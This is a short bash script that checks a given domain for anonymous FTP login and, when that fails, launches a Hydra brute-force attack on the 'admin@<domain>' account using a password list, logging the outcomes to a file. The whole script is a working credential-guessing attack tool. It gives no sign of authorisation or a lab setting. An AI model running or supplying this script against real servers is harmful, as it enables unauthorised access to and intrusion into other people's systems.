#!/bin/bash

# Function to check anonymous login and attempt Hydra if anonymous fails
check_login() {
    local domain="$1"

    # Check if domain resolves to an IP address
    if ! host "$domain" >/dev/null 2>&1; then
        echo "Error: Failed to resolve $domain. Skipping..."
        echo "$domain -> resolution_failed" >> login_results.txt
        return
    fi

    # Attempt anonymous login
    result=$(ftp -n $domain << END_SCRIPT
    quote USER anonymous
    quote PASS anonymous
    quit
END_SCRIPT
    )

    # Check if anonymous login was successful
    if echo "$result" | grep -q "230 Login successful"; then
        echo "$domain -> anonymous" >> login_results.txt
    else
        echo "$domain -> protected" >> login_results.txt
        # Run Hydra with admin@<target-domain> format
        hydra -l admin@$domain -P passwords.txt ftp://$domain | tee -a login_results.txt
    fi
}

# Check if domain parameter is provided
if [ $# -ne 1 ]; then
    echo "Usage: $0 <domain>"
    exit 1
fi

domain="$1"
echo "Testing $domain..."
check_login "$domain"
